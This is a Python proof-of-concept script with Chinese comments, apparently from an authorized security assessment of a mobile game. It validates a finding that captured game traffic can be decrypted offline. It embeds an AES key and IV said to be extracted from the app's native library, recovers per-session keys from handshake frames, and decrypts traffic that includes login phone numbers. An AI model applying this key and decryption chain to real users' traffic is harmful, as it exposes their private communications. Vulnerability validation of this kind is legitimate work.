#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-001 最小验证：SRS 流量加密密钥体系可离线重建（纯离线、只读）。

验证目标：仅凭 step2 已抓取的 pcap 派生产物（messages_decrypted_<scene>.json 中的
enc_body_hex 密文帧），用 Phase 3 从 libcocos2dlua.so 提取的默认 AES key/IV：
  1. 解密每个连接的首批握手帧（xy=1）得到常量明文 01000000；
  2. 解密 s2c xy=4 (SRS::RespKey) 帧提取会话密钥（线上格式 [keyLen:u8][key 字节]）；
  3. 用会话密钥解密该连接其余全部帧，与 step2 经 keystream 锚点独立恢复的明文
     （dec_hex 字段）逐字节交叉比对。

全部命中即证明：被动嗅探者无需任何交互即可完整还原 SRS 会话明文（含登录手机号）。

输入证据（只读，相对 traffic-analysis/）：
  step2/messages_decrypted_<scene>.json   —— pcap 帧清单（enc_body_hex + step2 明文锚点 dec_hex）
密钥材料来源（只读证据）：
  step3/crypto_native_analysis.json CRYPTO-005（默认 key @so 0x11f55ec / IV @0x11f560c）

用法：
  python3 validate_request.py --scene s02_login
  python3 validate_request.py --scene s06_phone_gold_ingame --max-frames 400
"""
import argparse
import json
import os
import shutil
import subprocess
import sys

BASE = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..'))

# Phase 3 CRYPTO-005 实测提取（libcocos2dlua.so vaddr 0x11f55ec / 0x11f560c）
DEFAULT_KEY = 'f362120513e389ff2311d7360123100705a210007acc023c3901da2ecb12448b'
DEFAULT_IV = '15ff010034ab4cd355fea122084f1307'


def aes_cfb_decrypt(key_hex: str, iv_hex: str, ct: bytes) -> bytes:
    """openssl AES-CFB128 解密（每帧 IV 重置，与 Phase 2 观测一致）。bits 随 key 长度。"""
    bits = len(bytes.fromhex(key_hex)) * 8
    p = subprocess.run(
        ['openssl', 'enc', '-aes-%d-cfb' % bits, '-d', '-K', key_hex, '-iv', iv_hex, '-nopad'],
        input=ct, capture_output=True)
    if p.returncode != 0:
        raise RuntimeError('openssl 解密失败: %s' % p.stderr.decode(errors='replace'))
    return p.stdout


def main():
    ap = argparse.ArgumentParser(description='VULN-001 SRS 被动解密离线验证（不发送任何网络请求）')
    ap.add_argument('--scene', default='s02_login',
                    help='step2 场景名（s02_login/s03_lobby/s04_createroom/s06_phone_gold_ingame）')
    ap.add_argument('--max-frames', type=int, default=300, help='单连接最多解密帧数（控制 openssl 调用量）')
    ap.add_argument('--out', default='', help='可选：证据 JSON 输出路径')
    args = ap.parse_args()

    if not shutil.which('openssl'):
        print('FATAL: 需要 openssl（用于 AES-CFB 解密）'); return 2

    msg_path = os.path.join(BASE, 'step2', 'messages_decrypted_%s.json' % args.scene)
    if not os.path.exists(msg_path):
        print('FATAL: 证据文件不存在: %s' % msg_path); return 2
    msgs = json.load(open(msg_path))

    flows = {}
    for e in msgs:
        flows.setdefault(e['flow'], []).append(e)

    report = {'scene': args.scene, 'flows': [], 'verdict': 'FAIL'}
    total_match = total_diff = 0
    for fid, es in sorted(flows.items()):
        es.sort(key=lambda e: e['ts'])
        fr = {'flow': fid, 'handshake_ok': False, 'respkey': None,
              'frames_matched': 0, 'frames_diff': 0, 'sample_plaintext': []}

        # 1) 默认 key 解握手帧：xy=1 应得常量明文 01000000
        hs = [e for e in es if e['xy'] == 1 and e['enc_body_hex']]
        if hs:
            pt = aes_cfb_decrypt(DEFAULT_KEY, DEFAULT_IV, bytes.fromhex(hs[0]['enc_body_hex']))
            fr['handshake_ok'] = (pt == b'\x01\x00\x00\x00')
            fr['handshake_plaintext'] = pt.hex()

        # 2) 默认 key 解 s2c xy=4 (SRS::RespKey)：线上格式 [keyLen:u8][key]
        sess_key = None
        rk_ts = None
        for e in es:
            if e['dir'] == 's2c' and e['xy'] == 4 and e['enc_body_hex']:
                pt = aes_cfb_decrypt(DEFAULT_KEY, DEFAULT_IV, bytes.fromhex(e['enc_body_hex']))
                if pt and pt[0] in (16, 24, 32) and len(pt) >= 1 + pt[0]:
                    sess_key = pt[1:1 + pt[0]].hex()
                    rk_ts = e['ts']
                    fr['respkey'] = {'key_len': pt[0], 'session_key_hex': sess_key}
                    break

        # 3) 会话密钥解 RespKey 之后的所有帧，与 step2 独立锚点明文 dec_hex 交叉比对
        if sess_key:
            n = 0
            for e in es:
                if e['ts'] <= rk_ts or not e['enc_body_hex']:
                    continue
                n += 1
                if n > args.max_frames:
                    break
                pt = aes_cfb_decrypt(sess_key, DEFAULT_IV, bytes.fromhex(e['enc_body_hex']))
                d = e.get('dec_hex') or ''
                if d:
                    if pt[:len(d) // 2].hex() == d:
                        fr['frames_matched'] += 1
                    else:
                        fr['frames_diff'] += 1
                if len(fr['sample_plaintext']) < 3 and pt:
                    fr['sample_plaintext'].append(
                        {'dir': e['dir'], 'xy': e['xy'], 'len': e['len'], 'pt_prefix': pt[:16].hex()})
        total_match += fr['frames_matched']
        total_diff += fr['frames_diff']
        report['flows'].append(fr)

    n_hs = sum(1 for f in report['flows'] if f['handshake_ok'])
    n_rk = sum(1 for f in report['flows'] if f['respkey'])
    report['summary'] = {
        'flows_total': len(report['flows']),
        'flows_handshake_decrypted_with_default_key': n_hs,
        'flows_session_key_recovered_offline': n_rk,
        'frames_cross_validated_match': total_match,
        'frames_cross_validated_diff': total_diff,
    }
    # 判定：全部连接握手帧可解 + 至少一条连接恢复会话密钥 + 交叉比对全中且零偏差
    ok = (n_hs == len(report['flows']) > 0) and n_rk > 0 and total_match > 0 and total_diff == 0
    report['verdict'] = 'PASS' if ok else 'FAIL'

    out = json.dumps(report, ensure_ascii=False, indent=1)
    if args.out:
        open(args.out, 'w').write(out)
        print('证据写入 %s' % args.out)
    print(json.dumps(report['summary'], ensure_ascii=False, indent=1))
    for f in report['flows'][:3]:
        if f['respkey']:
            print('flow %s 会话密钥(%dB)=%s' % (f['flow'], f['respkey']['key_len'], f['respkey']['session_key_hex']))
        for s in f['sample_plaintext'][:2]:
            print('  样本明文 %s xy=%d: %s' % (s['dir'], s['xy'], s['pt_prefix']))
    print('VERDICT: %s' % report['verdict'])
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
